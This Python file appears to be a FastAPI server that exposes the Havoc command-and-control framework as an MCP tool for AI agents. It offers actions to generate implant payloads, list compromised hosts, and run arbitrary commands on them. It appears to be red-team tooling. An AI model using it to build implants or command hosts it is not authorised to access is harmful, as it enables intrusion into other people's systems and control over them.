"""
Havoc C2 MCP Server

FastAPI server wrapping the Havoc C2 framework for post-exploitation
command and control operations.
"""

import asyncio
import json
from typing import Any

from fastapi import FastAPI
from pydantic import BaseModel, ConfigDict, Field


app = FastAPI(
    title="Havoc C2 MCP Server",
    description="C2 operations via Havoc Framework",
    version="1.0.0",
)


class HavocImplantRequest(BaseModel):
    model_config = ConfigDict(extra="ignore")

    action: str = Field(
        "generate",
        description="Action: generate, list, interact, task",
    )
    listener: str = Field("https", description="Listener type (https, smb, tcp)")
    host: str = Field("", description="Teamserver host")
    port: int = Field(40056, description="Teamserver port")
    arch: str = Field("x64", description="Architecture: x64, x86")
    format: str = Field("exe", description="Payload format: exe, dll, shellcode, ps1")
    # For interact/task actions
    agent_id: str = Field("", description="Target agent ID")
    command: str = Field("", description="Command to run on agent")
    timeout: int = Field(120, ge=10, le=600)


class HavocAgent(BaseModel):
    agent_id: str = ""
    hostname: str = ""
    username: str = ""
    internal_ip: str = ""
    os: str = ""
    process: str = ""
    pid: int = 0
    arch: str = ""
    last_callback: str = ""


class HavocResponse(BaseModel):
    success: bool
    action: str = ""
    agents: list[HavocAgent] = []
    payload_path: str | None = None
    task_output: str | None = None
    output: str | None = None
    error: str | None = None


@app.get("/")
async def root() -> dict[str, str]:
    return {"tool": "havoc", "path": "/tools/havoc_c2", "status": "ok"}


@app.get("/health")
async def health() -> dict[str, str]:
    return {"status": "healthy", "tool": "havoc"}


@app.post("/run")
async def run(body: dict[str, Any]) -> dict[str, Any]:
    """MCP executor dispatch endpoint."""
    args = body.get("args", {})
    req = HavocImplantRequest(**args)
    result = await havoc_c2(req)
    return result.model_dump()


@app.post("/tools/havoc_c2", response_model=HavocResponse)
async def havoc_c2(request: HavocImplantRequest) -> HavocResponse:
    """Interact with Havoc C2 framework."""
    try:
        if request.action == "generate":
            return await _generate_payload(request)
        elif request.action == "list":
            return await _list_agents(request)
        elif request.action == "interact" or request.action == "task":
            return await _task_agent(request)
        else:
            return HavocResponse(
                success=False,
                action=request.action,
                error=f"Unknown action: {request.action}",
            )
    except Exception as e:
        return HavocResponse(success=False, action=request.action, error=str(e)[:500])


async def _generate_payload(request: HavocImplantRequest) -> HavocResponse:
    """Generate a Havoc implant payload."""
    # Havoc uses havoc-client or API for payload generation
    cmd = [
        "havoc-client",
        "--host", request.host or "127.0.0.1",
        "--port", str(request.port),
        "payload", "generate",
        "--arch", request.arch,
        "--format", request.format,
        "--listener", request.listener,
        "--output", f"/tmp/havoc_payload.{request.format}",
    ]

    try:
        process = await asyncio.create_subprocess_exec(
            *cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )
        stdout, stderr = await asyncio.wait_for(
            process.communicate(), timeout=request.timeout,
        )
        output = stdout.decode("utf-8", errors="replace")

        return HavocResponse(
            success=process.returncode == 0,
            action="generate",
            payload_path=f"/tmp/havoc_payload.{request.format}",
            output=output[:3000],
        )
    except FileNotFoundError:
        return HavocResponse(success=False, action="generate", error="havoc-client not installed")
    except asyncio.TimeoutError:
        return HavocResponse(success=False, action="generate", error="Payload generation timed out")


async def _list_agents(request: HavocImplantRequest) -> HavocResponse:
    """List active Havoc agents."""
    cmd = [
        "havoc-client",
        "--host", request.host or "127.0.0.1",
        "--port", str(request.port),
        "agents", "list", "--json",
    ]

    try:
        process = await asyncio.create_subprocess_exec(
            *cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )
        stdout, _ = await asyncio.wait_for(
            process.communicate(), timeout=request.timeout,
        )
        output = stdout.decode("utf-8", errors="replace")

        agents: list[HavocAgent] = []
        try:
            data = json.loads(output)
            for a in data if isinstance(data, list) else []:
                agents.append(HavocAgent(
                    agent_id=a.get("AgentID", ""),
                    hostname=a.get("Hostname", ""),
                    username=a.get("Username", ""),
                    internal_ip=a.get("InternalIP", ""),
                    os=a.get("OS", ""),
                    process=a.get("Process", ""),
                    pid=a.get("PID", 0),
                    arch=a.get("Arch", ""),
                    last_callback=a.get("LastCallback", ""),
                ))
        except json.JSONDecodeError:
            pass

        return HavocResponse(
            success=True,
            action="list",
            agents=agents,
            output=output[:3000],
        )
    except FileNotFoundError:
        return HavocResponse(success=False, action="list", error="havoc-client not installed")
    except asyncio.TimeoutError:
        return HavocResponse(success=False, action="list", error="Timed out")


async def _task_agent(request: HavocImplantRequest) -> HavocResponse:
    """Send a task/command to a Havoc agent."""
    if not request.agent_id:
        return HavocResponse(success=False, action="task", error="agent_id required")
    if not request.command:
        return HavocResponse(success=False, action="task", error="command required")

    cmd = [
        "havoc-client",
        "--host", request.host or "127.0.0.1",
        "--port", str(request.port),
        "agents", "task",
        "--agent", request.agent_id,
        "--command", request.command,
    ]

    try:
        process = await asyncio.create_subprocess_exec(
            *cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )
        stdout, _ = await asyncio.wait_for(
            process.communicate(), timeout=request.timeout,
        )
        output = stdout.decode("utf-8", errors="replace")

        return HavocResponse(
            success=process.returncode == 0,
            action="task",
            task_output=output[:5000],
            output=output[:3000],
        )
    except FileNotFoundError:
        return HavocResponse(success=False, action="task", error="havoc-client not installed")
    except asyncio.TimeoutError:
        return HavocResponse(success=False, action="task", error="Task timed out")


@app.get("/tools/havoc_c2/schema")
async def get_schema() -> dict[str, Any]:
    return {
        "name": "havoc_c2",
        "description": "C2 operations via Havoc framework (generate payloads, manage agents, execute tasks)",
        "inputSchema": {
            "type": "object",
            "properties": {
                "action": {"type": "string", "description": "generate | list | interact | task"},
                "listener": {"type": "string", "description": "Listener type"},
                "agent_id": {"type": "string", "description": "Agent ID for tasks"},
                "command": {"type": "string", "description": "Command to execute"},
            },
            "required": ["action"],
        },
    }
